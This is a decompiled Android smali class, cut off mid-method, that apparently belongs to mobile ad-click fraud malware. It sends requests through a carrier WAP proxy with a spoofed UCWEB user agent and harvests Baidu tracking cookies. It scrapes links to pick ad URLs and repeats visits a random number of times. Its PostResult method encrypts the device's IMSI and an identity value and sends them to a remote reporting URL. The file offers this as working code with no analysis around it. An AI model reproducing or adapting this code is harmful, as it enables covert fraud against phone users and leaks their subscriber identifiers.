.class public Lcom/xxx/yyy/BBBB;
.super Ljava/lang/Object;
.source "BBBB.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/xxx/yyy/BBBB$LogRedirectHandler;
    }
.end annotation


# instance fields
.field TAG:Ljava/lang/String;

.field private adurl:Ljava/lang/String;

.field private context:Landroid/content/Context;

.field private cookieStore:Lorg/apache/http/client/CookieStore;

.field public docount:I

.field private dotype:I

.field public gwul:Ljava/lang/String;

.field public hmul:Ljava/lang/String;

.field private httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

.field public identity:Ljava/lang/String;

.field public imsi:Ljava/lang/String;

.field private iswap:I

.field private key:Ljava/lang/String;

.field private myCookie:Ljava/lang/String;

.field public prul:Ljava/lang/String;

.field private randomDoCount:I

.field private redirectUrl:Ljava/lang/String;

.field private refer:Ljava/lang/String;

.field private response:Lorg/apache/http/HttpResponse;

.field private result:I

.field private urls:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILandroid/content/Context;Ljava/lang/String;)V
    .locals 3
    .parameter "dc"
    .parameter "id"
    .parameter "gw"
    .parameter "hm"
    .parameter "pr"
    .parameter "im"
    .parameter "iw"
    .parameter "ct"
    .parameter "key"

    .prologue
    const-string v2, ""

    .line 66
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 51
    const-string v1, "MyTag"

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->TAG:Ljava/lang/String;

    .line 53
    const-string v1, ""

    iput-object v2, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    .line 64
    const/4 v1, 0x0

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    .line 65
    const-string v1, ""

    iput-object v2, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 69
    iput-object p8, p0, Lcom/xxx/yyy/BBBB;->context:Landroid/content/Context;

    .line 70
    iput p1, p0, Lcom/xxx/yyy/BBBB;->docount:I

    .line 71
    iput-object p2, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    .line 72
    iput-object p3, p0, Lcom/xxx/yyy/BBBB;->gwul:Ljava/lang/String;

    .line 73
    iput-object p4, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    .line 74
    iput-object p5, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    .line 75
    iput-object p6, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    .line 76
    iput p7, p0, Lcom/xxx/yyy/BBBB;->iswap:I

    .line 77
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    .line 78
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    iput-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    .line 79
    iget-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    new-instance v2, Lcom/xxx/yyy/BBBB$LogRedirectHandler;

    invoke-direct {v2, p0}, Lcom/xxx/yyy/BBBB$LogRedirectHandler;-><init>(Lcom/xxx/yyy/BBBB;)V

    invoke-virtual {v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->setRedirectHandler(Lorg/apache/http/client/RedirectHandler;)V

    .line 81
    iget-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v1

    .line 82
    const-string v2, "compatibility"

    .line 81
    invoke-static {v1, v2}, Lorg/apache/http/client/params/HttpClientParams;->setCookiePolicy(Lorg/apache/http/params/HttpParams;Ljava/lang/String;)V

    .line 84
    iget v1, p0, Lcom/xxx/yyy/BBBB;->iswap:I

    if-nez v1, :cond_0

    .line 86
    new-instance v0, Lorg/apache/http/HttpHost;

    const-string v1, "10.0.0.172"

    const/16 v2, 0x50

    invoke-direct {v0, v1, v2}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;I)V

    .line 87
    .local v0, proxy:Lorg/apache/http/HttpHost;
    iget-object v1, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v1

    const-string v2, "http.route.default-proxy"

    invoke-interface {v1, v2, v0}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 89
    .end local v0           #proxy:Lorg/apache/http/HttpHost;
    :cond_0
    const/4 v1, 0x2

    const/4 v2, 0x4

    invoke-direct {p0, v1, v2}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v1

    iput v1, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    .line 90
    iput-object p9, p0, Lcom/xxx/yyy/BBBB;->key:Ljava/lang/String;

    .line 91
    return-void
.end method

.method private FindHttpHead(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 11
    .parameter "body"
    .parameter "url"

    .prologue
    const/4 v6, 0x0

    const-string v10, "/"

    const-string v9, "https://"

    const-string v7, "http://"

    const-string v8, ""

    .line 362
    const-string v0, ""

    .line 363
    .local v0, head:Ljava/lang/String;
    const-string v5, "<base href"

    invoke-virtual {p1, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    if-lez v5, :cond_1

    .line 366
    const-string v4, "base href=\".*?\""

    .line 367
    .local v4, regex:Ljava/lang/String;
    invoke-static {v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v3

    .line 368
    .local v3, pt:Ljava/util/regex/Pattern;
    invoke-virtual {v3, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 369
    .local v2, mt:Ljava/util/regex/Matcher;
    :goto_0
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-nez v5, :cond_0

    move-object v1, v0

    .line 390
    .end local v0           #head:Ljava/lang/String;
    .end local v2           #mt:Ljava/util/regex/Matcher;
    .end local v3           #pt:Ljava/util/regex/Pattern;
    .end local v4           #regex:Ljava/lang/String;
    .local v1, head:Ljava/lang/String;
    :goto_1
    return-object v1

    .line 370
    .end local v1           #head:Ljava/lang/String;
    .restart local v0       #head:Ljava/lang/String;
    .restart local v2       #mt:Ljava/util/regex/Matcher;
    .restart local v3       #pt:Ljava/util/regex/Pattern;
    .restart local v4       #regex:Ljava/lang/String;
    :cond_0
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v5

    const-string v6, "base href=\"|\""

    const-string v7, ""

    invoke-virtual {v5, v6, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "&amp;"

    const-string v7, "&"

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    .line 378
    .end local v2           #mt:Ljava/util/regex/Matcher;
    .end local v3           #pt:Ljava/util/regex/Pattern;
    .end local v4           #regex:Ljava/lang/String;
    :cond_1
    const-string v5, "http://"

    invoke-virtual {p2, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 380
    const-string v5, "http://"

    const-string v5, ""

    invoke-virtual {p2, v7, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 381
    const-string v5, "/"

    invoke-virtual {v0, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v0, v6, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 382
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "http://"

    invoke-direct {v5, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_2
    :goto_2
    move-object v1, v0

    .line 390
    .end local v0           #head:Ljava/lang/String;
    .restart local v1       #head:Ljava/lang/String;
    goto :goto_1

    .line 384
    .end local v1           #head:Ljava/lang/String;
    .restart local v0       #head:Ljava/lang/String;
    :cond_3
    const-string v5, "https://"

    invoke-virtual {p2, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 386
    const-string v5, "https://"

    const-string v5, ""

    invoke-virtual {p2, v9, v8}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 387
    const-string v5, "/"

    invoke-virtual {v0, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v0, v6, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 388
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "https://"

    invoke-direct {v5, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2
.end method

.method private FixUrls(Ljava/lang/String;Ljava/lang/String;)V
    .locals 10
    .parameter "body"
    .parameter "head"

    .prologue
    .line 304
    const-string v5, "<a.*?/a>"

    .line 305
    .local v5, regex:Ljava/lang/String;
    invoke-static {v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v3

    .line 306
    .local v3, pt:Ljava/util/regex/Pattern;
    invoke-virtual {v3, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    .line 307
    .local v1, mt:Ljava/util/regex/Matcher;
    :cond_0
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-nez v7, :cond_1

    .line 359
    :goto_0
    return-void

    .line 312
    :cond_1
    const-string v6, "a href=\".*?\""

    .line 313
    .local v6, s3:Ljava/lang/String;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "*"

    invoke-virtual {v7, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v7

    if-lez v7, :cond_2

    .line 315
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    const/4 v8, 0x1

    if-ne v7, v8, :cond_0

    .line 317
    invoke-static {v6}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v4

    .line 318
    .local v4, pt3:Ljava/util/regex/Pattern;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 319
    .local v2, mt3:Ljava/util/regex/Matcher;
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-eqz v7, :cond_0

    .line 323
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "a href=\"|\""

    const-string v9, ""

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "&amp;"

    const-string v9, "&"

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    goto :goto_0

    .line 330
    .end local v2           #mt3:Ljava/util/regex/Matcher;
    .end local v4           #pt3:Ljava/util/regex/Pattern;
    :cond_2
    invoke-static {v6}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v4

    .line 331
    .restart local v4       #pt3:Ljava/util/regex/Pattern;
    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v2

    .line 332
    .restart local v2       #mt3:Ljava/util/regex/Matcher;
    :goto_1
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-eqz v7, :cond_0

    .line 333
    invoke-virtual {v2}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v7

    const-string v8, "a href=\"|\""

    const-string v9, ""

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "&amp;"

    const-string v9, "&"

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 337
    .local v0, link:Ljava/lang/String;
    const-string v7, "http://"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_3

    .line 339
    const-string v7, "./"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 341
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v8, 0x2

    invoke-virtual {v0, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 355
    :cond_3
    :goto_2
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_1

    .line 343
    :cond_4
    const-string v7, "/"

    invoke-virtual {v0, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 345
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v8, 0x1

    invoke-virtual {v0, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    .line 349
    :cond_5
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2
.end method

.method private GetRandomFromMinToMax(II)I
    .locals 5
    .parameter "min"
    .parameter "max"

    .prologue
    .line 295
    new-instance v0, Ljava/util/Date;

    invoke-direct {v0}, Ljava/util/Date;-><init>()V

    .line 296
    .local v0, currentTime:Ljava/util/Date;
    new-instance v1, Ljava/util/Random;

    invoke-virtual {v0}, Ljava/util/Date;->getTime()J

    move-result-wide v3

    invoke-direct {v1, v3, v4}, Ljava/util/Random;-><init>(J)V

    .line 297
    .local v1, rd:Ljava/util/Random;
    invoke-virtual {v1, p2}, Ljava/util/Random;->nextInt(I)I

    move-result v3

    add-int v2, p1, v3

    .line 300
    .local v2, ret:I
    return v2
.end method

.method private HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .parameter "url"
    .parameter "ref"

    .prologue
    const-string v11, ""

    .line 172
    new-instance v5, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v5, p1}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 173
    .local v5, method:Lorg/apache/http/client/methods/HttpGet;
    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v9

    if-lez v9, :cond_0

    .line 174
    const-string v9, "Referer"

    invoke-virtual {v5, v9, p2}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 184
    :cond_0
    const-string v9, "User-Agent"

    const-string v10, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 185
    const-string v9, "Accept"

    const-string v10, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 191
    :try_start_0
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    if-eqz v9, :cond_1

    .line 192
    new-instance v4, Lorg/apache/http/protocol/BasicHttpContext;

    invoke-direct {v4}, Lorg/apache/http/protocol/BasicHttpContext;-><init>()V

    .line 193
    .local v4, localContext:Lorg/apache/http/protocol/BasicHttpContext;
    const-string v9, "http.cookie-store"

    iget-object v10, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    invoke-virtual {v4, v9, v10}, Lorg/apache/http/protocol/BasicHttpContext;->setAttribute(Ljava/lang/String;Ljava/lang/Object;)V

    .line 194
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v9, v5, v4}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;Lorg/apache/http/protocol/HttpContext;)Lorg/apache/http/HttpResponse;

    move-result-object v9

    iput-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    .line 199
    .end local v4           #localContext:Lorg/apache/http/protocol/BasicHttpContext;
    :goto_0
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v9}, Lorg/apache/http/impl/client/DefaultHttpClient;->getCookieStore()Lorg/apache/http/client/CookieStore;

    move-result-object v9

    iput-object v9, p0, Lcom/xxx/yyy/BBBB;->cookieStore:Lorg/apache/http/client/CookieStore;

    .line 201
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-interface {v9}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v9

    invoke-interface {v9}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    move-result v7

    .line 213
    .local v7, status:I
    const/16 v9, 0xc8

    if-eq v7, v9, :cond_2

    .line 259
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 214
    const-string v9, ""

    move-object v9, v11

    .line 257
    .end local v7           #status:I
    :goto_1
    return-object v9

    .line 197
    :cond_1
    :try_start_1
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v9, v5}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v9

    iput-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    goto :goto_0

    .line 240
    :catch_0
    move-exception v9

    move-object v1, v9

    .line 242
    .local v1, e:Lorg/apache/http/client/ClientProtocolException;
    :try_start_2
    invoke-virtual {v1}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 259
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 245
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 216
    .end local v1           #e:Lorg/apache/http/client/ClientProtocolException;
    .restart local v7       #status:I
    :cond_2
    :try_start_3
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    const-string v10, "Set-Cookie"

    invoke-interface {v9, v10}, Lorg/apache/http/HttpResponse;->getFirstHeader(Ljava/lang/String;)Lorg/apache/http/Header;

    move-result-object v3

    .line 217
    .local v3, head:Lorg/apache/http/Header;
    const/4 v8, 0x0

    .line 218
    .local v8, tmpCookie:Ljava/lang/String;
    if-eqz v3, :cond_3

    .line 219
    invoke-interface {v3}, Lorg/apache/http/Header;->getValue()Ljava/lang/String;

    move-result-object v8

    .line 220
    :cond_3
    if-eqz v8, :cond_4

    const-string v9, "BAIDU_WISE_UID"

    invoke-virtual {v8, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 221
    iput-object v8, p0, Lcom/xxx/yyy/BBBB;->myCookie:Ljava/lang/String;

    .line 223
    :cond_4
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-interface {v9}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v2

    .line 233
    .local v2, entity:Lorg/apache/http/HttpEntity;
    iget-object v9, p0, Lcom/xxx/yyy/BBBB;->response:Lorg/apache/http/HttpResponse;

    invoke-virtual {p0, v9}, Lcom/xxx/yyy/BBBB;->getContentCharset(Lorg/apache/http/HttpResponse;)Ljava/lang/String;

    move-result-object v0

    .line 234
    .local v0, charset:Ljava/lang/String;
    invoke-interface {v2}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v9

    invoke-virtual {p0, v9, v0}, Lcom/xxx/yyy/BBBB;->generateString(Ljava/io/InputStream;Ljava/lang/String;)Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    move-result-object v6

    .line 259
    .local v6, result:Ljava/lang/String;
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    move-object v9, v6

    .line 239
    goto :goto_1

    .line 246
    .end local v0           #charset:Ljava/lang/String;
    .end local v2           #entity:Lorg/apache/http/HttpEntity;
    .end local v3           #head:Lorg/apache/http/Header;
    .end local v6           #result:Ljava/lang/String;
    .end local v7           #status:I
    .end local v8           #tmpCookie:Ljava/lang/String;
    :catch_1
    move-exception v9

    move-object v1, v9

    .line 248
    .local v1, e:Ljava/io/IOException;
    :try_start_4
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 259
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 251
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 252
    .end local v1           #e:Ljava/io/IOException;
    :catch_2
    move-exception v9

    move-object v1, v9

    .line 254
    .local v1, e:Ljava/lang/Exception;
    :try_start_5
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 259
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 257
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 258
    .end local v1           #e:Ljava/lang/Exception;
    :catchall_0
    move-exception v9

    .line 259
    invoke-virtual {v5}, Lorg/apache/http/client/methods/HttpGet;->abort()V

    .line 260
    throw v9
.end method

.method private PostResult(I)V
    .locals 5
    .parameter "result"

    .prologue
    const-string v3, "&"

    .line 518
    const-string v1, ""

    .line 520
    .local v1, tmpIm:Ljava/lang/String;
    :try_start_0
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "&"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->key:Ljava/lang/String;

    invoke-static {v3, v4}, Lcom/xxx/yyy/ddda;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 525
    :goto_0
    const-string v2, ""

    .line 526
    .local v2, url:Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_0

    .line 527
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "?im="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 532
    :goto_1
    const-string v3, ""

    invoke-direct {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 533
    return-void

    .line 521
    .end local v2           #url:Ljava/lang/String;
    :catch_0
    move-exception v3

    move-object v0, v3

    .line 523
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 529
